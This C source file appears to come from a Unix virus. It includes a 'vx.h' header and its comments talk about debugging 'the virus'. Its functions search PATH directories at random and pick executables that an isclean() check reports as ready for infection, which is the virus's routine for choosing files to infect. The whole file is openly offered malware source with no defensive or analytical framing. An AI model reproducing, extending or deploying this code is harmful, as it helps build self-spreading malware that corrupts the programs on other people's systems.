/* this file contains the functions for find first/next :)
 * and all the others ...
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include "vx.h"

#ifdef DEBUG
extern FILE *fd;
#endif

/* the same as 'whereis' on the shell 
 * ATTENTION -  return only static - t.m. you can't 
 * use it for further actions.At the next call of whereis() the
 * buffer will be overwritten !!!
 * So its need to save the return in a copy before we call whereis()
 * again.
 */
 
char *whereis(char *path, char *prog)
{
#define IN_PATH path - _begin < pathlen + 2

   	static char file[200];
        int i = 0, pathlen;
        char *_begin;
        struct stat status;
                
        _begin = path;
        pathlen = strlen(path);
        if (strstr(prog,"/") != NULL) /* if its entered with path */
              	return prog;          /* -> gotcha */
        memset(file,'\0',200);
                
        /*  Loop until found or the pointer is not longer "in path".
         *  [the strXYZ() functions fuzzy the best debugger.
         *  If you want feel free to debug the virus. :-> ]
         */
         
        while (access(file, X_OK) != 0 && IN_PATH) {
                i = strcspn(path,":");  /* split string into dirs */
                strcpy(file, "");  	/* only for '\0' ! */
                strncat(file, path, i);   
                strcat(file, "/");
                strcat(file, prog);
                path = path + i + 1;
        }   
        if (!(IN_PATH))
           	return NULL;
        else {
        DFPRINTF("@f whereis: found file <%s>\n", file);
           	return file;        
        }        
#undef IN_PATH                
}

/* search randomly a directory (one from path)
 * and use this for further actions
 */

char *getdir(char *path)
{
#define NOT_IN_PATH path - _begin >= pathlen
#define RANDNUM (int)((double)strlen(path)*rand()/(RAND_MAX + 1.0))

   	static char dir[100];
        int n, r, not_found = 1, pathlen;
        char *_begin;
        static first = 1;
        
        _begin = path;
        pathlen = strlen(path);
        
        memset(dir,'\0',100);
        if (first)
           srand(getpid());
        first = 0;
               
   	while (not_found) {
           	r = RANDNUM;              
                path += r;
                if (r != 0) {
                   	path += strcspn(path, ":");
                        path ++;
                }
                if (NOT_IN_PATH) {
                   	path = _begin;
                        continue;
                }   
                not_found = 0;
                n = strcspn(path, ":");
                strcpy(dir, "");	/* ... */ 
                strncat(dir, path, n);   
                strcat(dir,"");		/* needed ??? ... */
        }   
        DFPRINTF("@f getdir: found directory <%s>\n", dir);
        return dir;
        
#undef NOT_IN_PATH        
#undef RANDNUM        
}

/* Search in 'dir' until a "good" file is found
 * or all of them are seen as "bad" .
 * In this case we come back later :-) .
 * If flag == 1 return includes path, if flag == 0 not.
 */

char *gethost(char *dir, int flag)
{
#define RANDNUM (int)((double)(found)*rand()/(RAND_MAX + 1.0)) /* uff */

   	static int first = 1, gen = 0;
        int r, i = 0;
        static struct dirent **filelist; 
        char *host, *path;
        static int found;
                
        path = getenv("PATH");

       /* Only 'randomize' at the first call .
        * Use scandir() to read out the directory.
        */
        if (first) {
           	if ((found = scandir(dir, &filelist, 0, 0)) <= 0)
                   	return NULL; 
                srand(getpid());
        }
        r = RANDNUM;        
        
        /* Get one of the file randomly. */
        
        if ((host = whereis(path, filelist[r]->d_name)) == NULL) 
               	return NULL;
        /* isclean means ready for infection: NOT a directory
         * NOT a textfile and NOT infected
         */
        while (isclean(host) != 1 && i < found) {
           	r = RANDNUM;         
                if((host = whereis(path, filelist[r]->d_name)) == NULL)
                   	return NULL;
                i++;
        }       
        first = 0;
        if (i >= found) 
           	return NULL;
        else {
        DFPRINTF("@f gethost: got host <%s>\n", host);      
           	if (flag == 0)	
                   	return filelist[r]->d_name; /* static */
                if (flag == 1) 
                   	return host; /* static, da host ein statischer */
                else	             /* return von *whereis(...) ist */		
                   	return NULL;                
        }                
#undef RANDNUM
}       
